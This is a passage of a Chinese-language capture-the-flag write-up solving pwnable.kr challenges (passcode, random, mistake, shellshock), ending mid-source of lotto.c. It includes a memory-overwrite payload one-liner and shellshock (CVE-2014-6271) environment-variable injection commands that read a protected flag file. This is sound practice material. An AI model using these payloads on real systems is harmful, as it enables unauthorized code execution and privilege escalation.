</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">.text:08048562 ; ---------------------------------------------------------------------------
</span></span><span class="line"><span class="cl">.text:08048563                 align 4
</span></span><span class="line"><span class="cl">.text:08048564
</span></span><span class="line"><span class="cl">.text:08048564 ; =============== S U B R O U T I N E =======================================
</span></span><span class="line"><span class="cl">.text:08048564
</span></span><span class="line"><span class="cl">.text:08048564 ; Attributes: bp-based frame
</span></span><span class="line"><span class="cl">.text:08048564
</span></span><span class="line"><span class="cl">.text:08048564                 public login
</span></span><span class="line"><span class="cl">.text:08048564 login           proc near               ; CODE XREF: main+1A↓p
</span></span><span class="line"><span class="cl">.text:08048564
</span></span><span class="line"><span class="cl">.text:08048564 var_10          = dword ptr -10h
</span></span><span class="line"><span class="cl">.text:08048564 var_C           = dword ptr -0Ch
</span></span><span class="line"><span class="cl">.text:08048564
</span></span><span class="line"><span class="cl">.text:08048564 ; __unwind {
</span></span><span class="line"><span class="cl">.text:08048564                 push    ebp
</span></span><span class="line"><span class="cl">.text:08048565                 mov     ebp, esp
</span></span><span class="line"><span class="cl">.text:08048567                 sub     esp, 28h
</span></span><span class="line"><span class="cl">.text:0804856A                 mov     eax, offset format ; &#34;enter passcode1 : &#34;
</span></span><span class="line"><span class="cl">.text:0804856F                 mov     [esp], eax      ; format
</span></span><span class="line"><span class="cl">.text:08048572                 call    _printf
</span></span><span class="line"><span class="cl">.text:08048577                 mov     eax, offset aD  ; &#34;%d&#34;
</span></span><span class="line"><span class="cl">.text:0804857C                 mov     edx, [ebp+var_10]
</span></span><span class="line"><span class="cl">.text:0804857F                 mov     [esp+4], edx
</span></span><span class="line"><span class="cl">.text:08048583                 mov     [esp], eax
</span></span><span class="line"><span class="cl">.text:08048586                 call    ___isoc99_scanf
</span></span><span class="line"><span class="cl">.text:0804858B                 mov     eax, ds:stdin@@GLIBC_2_0
</span></span><span class="line"><span class="cl">.text:08048590                 mov     [esp], eax      ; stream
</span></span><span class="line"><span class="cl">.text:08048593                 call    _fflush
</span></span><span class="line"><span class="cl">.text:08048598                 mov     eax, offset aEnterPasscode2 ; &#34;enter passcode2 : &#34;
</span></span><span class="line"><span class="cl">.text:0804859D                 mov     [esp], eax      ; format
</span></span><span class="line"><span class="cl">.text:080485A0                 call    _printf
</span></span><span class="line"><span class="cl">.text:080485A5                 mov     eax, offset aD  ; &#34;%d&#34;
</span></span><span class="line"><span class="cl">.text:080485AA                 mov     edx, [ebp+var_C]
</span></span><span class="line"><span class="cl">.text:080485AD                 mov     [esp+4], edx
</span></span><span class="line"><span class="cl">.text:080485B1                 mov     [esp], eax
</span></span><span class="line"><span class="cl">.text:080485B4                 call    ___isoc99_scanf
</span></span><span class="line"><span class="cl">.text:080485B9                 mov     dword ptr [esp], offset s ; &#34;checking...&#34;
</span></span><span class="line"><span class="cl">.text:080485C0                 call    _puts
</span></span><span class="line"><span class="cl">.text:080485C5                 cmp     [ebp+var_10], 528E6h
</span></span><span class="line"><span class="cl">.text:080485CC                 jnz     short loc_80485F1
</span></span><span class="line"><span class="cl">.text:080485CE                 cmp     [ebp+var_C], 0CC07C9h
</span></span><span class="line"><span class="cl">.text:080485D5                 jnz     short loc_80485F1
</span></span><span class="line"><span class="cl">.text:080485D7                 mov     dword ptr [esp], offset aLoginOk ; &#34;Login OK!&#34;
</span></span><span class="line"><span class="cl">.text:080485DE                 call    _puts
</span></span><span class="line"><span class="cl">.text:080485E3                 mov     dword ptr [esp], offset command ; &#34;/bin/cat flag&#34;
</span></span><span class="line"><span class="cl">.text:080485EA                 call    _system
</span></span><span class="line"><span class="cl">.text:080485EF                 leave
</span></span><span class="line"><span class="cl">.text:080485F0                 retn
</span></span></code></pre></td></tr></table>
</div>
</div><p>0x080485e3=134514147</p>
<h3 id="实现" class="headerLink">
    <a href="#%e5%ae%9e%e7%8e%b0" class="header-mark"></a>实现:</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;print &#34;A&#34;*96+&#34;</span><span class="se">\x00\xa0\x04\x08</span><span class="s1">&#34;+&#34;134514147</span><span class="se">\n</span><span class="s1">&#34;&#39;</span> <span class="o">|</span> <span class="o">./</span><span class="n">passcode</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="6-random" class="headerLink">
    <a href="#6-random" class="header-mark"></a>6 random</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">random</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">random</span> <span class="o">=</span> <span class="nf">rand</span><span class="p">();</span>        <span class="c1">// random value!
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">key</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="n">key</span> <span class="o">^</span> <span class="n">random</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xdeadbeef</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Good!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Wrong, maybe you should try 2^32 cases.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>注意到<code>rand()</code>没有用<code>srand()</code>设定种子, 那么种子默认为1, 生成的随机数应该是一个固定的序列.
我们在本地编译, 用gdb调试该程序, 得到random的值为1804289383.
而key^random的值应该是0xdeadbeef, 由于^的逆运算是它本身, deadbeef^random=key.
算出key = -1255736440, 运行random程序输入key得到flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">random@pwnable:~$ ./random
</span></span><span class="line"><span class="cl">-1255736440
</span></span><span class="line"><span class="cl">Good!
</span></span><span class="line"><span class="cl">Mommy, I thought libc random is unpredictable...
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="7-input" class="headerLink">
    <a href="#7-input" class="header-mark"></a>7 input</h2><h2 id="8-leg" class="headerLink">
    <a href="#8-leg" class="header-mark"></a>8 leg</h2><h2 id="9-mistake" class="headerLink">
    <a href="#9-mistake" class="header-mark"></a>9 mistake</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">We all make mistakes, let&#39;s move on.
</span></span><span class="line"><span class="cl">(don&#39;t take this too seriously, no fancy hacking skill is required at all)
</span></span><span class="line"><span class="cl">This task is based on real event
</span></span><span class="line"><span class="cl">Thanks to dhmonkey
</span></span><span class="line"><span class="cl">hint : operator priority
</span></span><span class="line"><span class="cl">ssh mistake@pwnable.kr -p2222 (pw:guest)
</span></span></code></pre></td></tr></table>
</div>
</div><p>提示是操作符的优先级</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PW_LEN 10
</span></span></span><span class="line"><span class="cl"><span class="cp">#define XORKEY 1 
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">void</span> <span class="nf">xor</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">s</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">XORKEY</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">fd</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="s">&#34;/home/mistake/password&#34;</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">,</span><span class="mo">0400</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;can&#39;t open password %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;do not bruteforce...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sleep</span><span class="p">(</span><span class="nf">time</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">%</span><span class="mi">20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">pw_buf</span><span class="p">[</span><span class="n">PW_LEN</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">len</span><span class="o">=</span><span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="n">pw_buf</span><span class="p">,</span><span class="n">PW_LEN</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;read error</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">pw_buf2</span><span class="p">[</span><span class="n">PW_LEN</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;input password : &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%10s&#34;</span><span class="p">,</span> <span class="n">pw_buf2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// xor your input
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">xor</span><span class="p">(</span><span class="n">pw_buf2</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nf">strncmp</span><span class="p">(</span><span class="n">pw_buf</span><span class="p">,</span> <span class="n">pw_buf2</span><span class="p">,</span> <span class="n">PW_LEN</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Password OK</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Wrong Password</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>观察这一行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="n">fd</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="s">&#34;/home/mistake/password&#34;</span><span class="p">,</span><span class="n">O_RDONLY</span><span class="p">,</span><span class="mo">0400</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>乍一看没什么不对, 当返回的文件描述符小于0时报错
但是<code>&lt;</code>是比<code>=</code>优先级高的, 所以事实上首先open()会返回3(0, 1, 2是什么见第1题fd), 然后执行3&lt;0这个表达式, 它的值是0. 最后执行<code>fd=0</code>, 由第一题fd我们学到了fd = 0是stdin. 所以事实上password是我们输入的.
然后我们再来看xor这个函数, 它将一个字符串的前n个字符与1异或. 题目中给出的是前10个字符.
所以我们只需要先输入10个字符作为password, 再输入这些字符异或1得到的字符串. 由于字符'0&rsquo;的ascii码为110000, 字符'1&rsquo;的ascii码为110001, 恰好'0&rsquo;^1 = &lsquo;1&rsquo;. 所以只需进行如下操作</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">./mistake
</span></span><span class="line"><span class="cl">do not bruteforce...
</span></span><span class="line"><span class="cl">0000000000
</span></span><span class="line"><span class="cl">1111111111input password : 
</span></span><span class="line"><span class="cl">Password OK
</span></span><span class="line"><span class="cl">Mommy, the operator priority always confuses me :(
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="10-shellshock" class="headerLink">
    <a href="#10-shellshock" class="header-mark"></a>10 shellshock</h2><p>这是一个set-uid程序:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">setresuid</span><span class="p">(</span><span class="nf">getegid</span><span class="p">(),</span> <span class="nf">getegid</span><span class="p">(),</span> <span class="nf">getegid</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nf">setresgid</span><span class="p">(</span><span class="nf">getegid</span><span class="p">(),</span> <span class="nf">getegid</span><span class="p">(),</span> <span class="nf">getegid</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/home/shellshock/bash -c &#39;echo shock_me&#39;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这是一个别名为shellshock的漏洞, CVE-2014-6271
原理大概是bash读取环境变量时会调用后面的函数, 在调用bash时会直接触发</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">export foo=&#39;{:;}; echo test&#39;
</span></span><span class="line"><span class="cl">bash
</span></span><span class="line"><span class="cl">test
</span></span></code></pre></td></tr></table>
</div>
</div><p>测试方法:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">shellshock@pwnable:~$ env x=&#39;() { :;}; echo vulnerable&#39; bash -c &#34;echo this is a test&#34;
</span></span><span class="line"><span class="cl">this is a test
</span></span><span class="line"><span class="cl">shellshock@pwnable:~$ env x=&#39;() { :;}; echo vulnerable&#39; ./bash -c &#34;echo this is a test&#34;
</span></span><span class="line"><span class="cl">vulnerable
</span></span></code></pre></td></tr></table>
</div>
</div><p>证明环境变量中的bash没有此漏洞, 而当前目录的bash有此漏洞
攻击该程序: 如果real uid和effective uid相同时, 环境变量在程序内有效, 就可以利用这个漏洞. 而本题代码中</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">setresuid</span><span class="p">(</span><span class="nf">getegid</span><span class="p">(),</span> <span class="nf">getegid</span><span class="p">(),</span> <span class="nf">getegid</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="nf">setresgid</span><span class="p">(</span><span class="nf">getegid</span><span class="p">(),</span> <span class="nf">getegid</span><span class="p">(),</span> <span class="nf">getegid</span><span class="p">());</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>确保了这一点.
所以可以这样攻击:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">shellshock@ubuntu:~$ env x=&#39;() { :;}; /bin/cat flag&#39; ./shellshock
</span></span><span class="line"><span class="cl">only if I knew CVE-2014-6271 ten years ago..!!
</span></span><span class="line"><span class="cl">Segmentation fault
</span></span><span class="line"><span class="cl">shellshock@ubuntu:~$
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="11-coin1" class="headerLink">
    <a href="#11-coin1" class="header-mark"></a>11 coin1</h2><h2 id="12-blackjack" class="headerLink">
    <a href="#12-blackjack" class="header-mark"></a>12 blackjack</h2><h2 id="13-lotto" class="headerLink">
    <a href="#13-lotto" class="header-mark"></a>13 lotto</h2><p>lotto.c:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span><span class="lnt">95
</span><span class="lnt">96
</span><span class="lnt">97
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">submit</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">play</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Submit your 6 lotto bytes : &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">r</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">submit</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Lotto Start!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//sleep(1);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// generate lotto numbers
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/urandom&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">fd</span><span class="o">==-</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;error. tell admin</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
